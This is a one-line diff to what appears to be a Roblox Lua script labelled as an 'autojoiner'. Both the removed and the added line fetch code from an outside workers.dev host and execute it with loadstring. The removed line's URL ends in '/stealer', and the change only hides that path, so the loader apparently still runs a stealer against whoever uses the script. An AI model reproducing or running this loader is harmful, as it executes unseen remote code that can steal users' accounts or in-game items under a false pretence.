@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://autojoinermm2.szumescript.workers.dev/stealer"))()
+loadstring(game:HttpGet("autojoinermm2.szumescript.workers.dev"))()
